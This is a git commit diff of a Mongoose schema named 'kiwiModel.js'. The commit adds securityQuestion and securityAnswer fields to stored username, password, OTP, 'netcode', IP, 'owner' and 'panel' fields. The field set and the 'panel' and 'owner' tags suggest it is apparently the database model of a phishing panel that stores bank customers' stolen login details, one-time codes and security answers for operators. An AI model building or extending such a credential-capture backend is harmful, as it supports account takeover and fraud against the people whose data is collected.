d61c2a885affd04853226f65aee7b182147d686d
Your Name <you@example.com>
2023-03-15 22:00:41 +0000

    make

--- models/kiwiModel.js
+++ models/kiwiModel.js
@@ -1,16 +1,18 @@
 const mongoose = require("mongoose");
 
 const kiwiSchema = new mongoose.Schema({
-    uniqueid: String,
-    username: String,
-    password: String,
-    telephone: String,
-    otp: String,
-    netcode: String,
-    status: Number,
-    ip: String,
-    owner: String,
-    panel: { type: "string", default: "kiwi" },
+  uniqueid: String,
+  username: String,
+  password: String,
+  telephone: String,
+  otp: String,
+  netcode: String,
+  securityQuestion: String,
+  securityAnswer: String,
+  status: Number,
+  ip: String,
+  owner: String,
+  panel: { type: "string", default: "kiwi" },
 });
 
 module.exports = mongoose.model("Kiwi", kiwiSchema);
